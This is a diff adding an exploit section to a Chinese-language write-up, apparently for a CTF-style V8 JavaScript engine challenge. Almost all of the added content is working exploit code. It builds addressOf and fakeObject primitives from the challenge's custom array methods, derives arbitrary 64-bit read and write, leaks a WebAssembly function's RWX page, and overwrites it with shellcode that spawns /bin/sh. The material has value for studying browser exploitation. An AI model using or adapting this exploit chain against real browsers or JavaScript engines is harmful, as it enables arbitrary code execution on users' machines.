@@ -332,5 +332,119 @@ Wasm简单来说就是让java直接执行高级语言生成的机器码的一种
 由于安全性的考虑不，浏览器不允许通过wasm直接调用系统函数，但可以先将无害的wasm写入，然后通过上面的任意写的漏洞，将shellcode写入wasm,就可以再调用wasm时，实际调用的就是shellcode了。
 exp:
 ```
+// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
 
+var buf =new ArrayBuffer(16);
+var float64 = new Float64Array(buf);
+var bigUint64 = new BigUint64Array(buf);
+
+// 浮点数转换为64位无符号整数
+function f2i(f)
+{
+    float64[0] = f;
+    return bigUint64[0];
+}
+// 64位无符号整数转为浮点数
+function i2f(i)
+{
+    bigUint64[0] = i;
+    return float64[0];
+}
+// 64位无符号整数转为16进制字节串
+function hex(i)
+{
+    return i.toString(16).padStart(16, "0");
+}
+
+// ××××××××2. addressOf和fakeObject的实现××××××××
+var obj = {"a": 1};
+var obj_array = [obj];
+var float_array = [1.1];
+
+var obj_array_map = obj_array.Myread();
+var float_array_map = float_array.Myread();
+
+// 泄露某个object的地址
+function addressOf(obj_to_leak)
+{
+    obj_array[0] = obj_to_leak;
+    obj_array.Mywrite(float_array_map);
+    let obj_addr = f2i(obj_array[0]) - 1n;
+    obj_array.Mywrite(obj_array_map); // 还原array类型，以便后续继续使用
+    return obj_addr;
+}
+
+// 将某个addr强制转换为object对象
+function fakeObject(addr_to_fake)
+{
+    float_array[0] = i2f(addr_to_fake + 1n);
+    float_array.Mywrite(obj_array_map);
+    let faked_obj = float_array[0];
+    float_array.Mywrite(float_array_map); // 还原array类型，以便后续继续使用
+    return faked_obj;
+}
+
+
+var fake_array = [
+    float_array_map,
+    i2f(0n),
+    i2f(0x41414141n),
+    i2f(0x1000000000n),
+    1.1,
+    2.2,
+];
+
+var fake_array_addr = addressOf(fake_array);
+var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
+var fake_object = fakeObject(fake_object_addr);
+
+function read64(addr)
+{
+    fake_array[2] = i2f(addr - 0x10n + 0x1n);
+    let leak_data = f2i(fake_object[0]);
+    console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));
+    return leak_data;
+}
+
+function write64(addr, data)
+{
+    fake_array[2] = i2f(addr - 0x10n + 0x1n);
+    fake_object[0] = i2f(data);
+    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));    
+}
+
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+var f = wasmInstance.exports.main;
+
+var f_addr = addressOf(f);
+console.log("[*] leak wasm func addr: 0x" + hex(f_addr));
+
+var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
+var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
+var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
+var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
+
+console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));
+
+var shellcode = [
+    0x2fbb485299583b6an,
+    0x5368732f6e69622fn,
+    0x050f5e5457525f54n
+];
+
+var data_buf = new ArrayBuffer(24);
+var data_view = new DataView(data_buf);
+var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
+
+write64(buf_backing_store_addr, rwx_page_addr);
+data_view.setFloat64(0, i2f(shellcode[0]), true);
+data_view.setFloat64(8, i2f(shellcode[1]), true);
+data_view.setFloat64(16, i2f(shellcode[2]), true);
+
+
+f();
 ```
+# my_vm
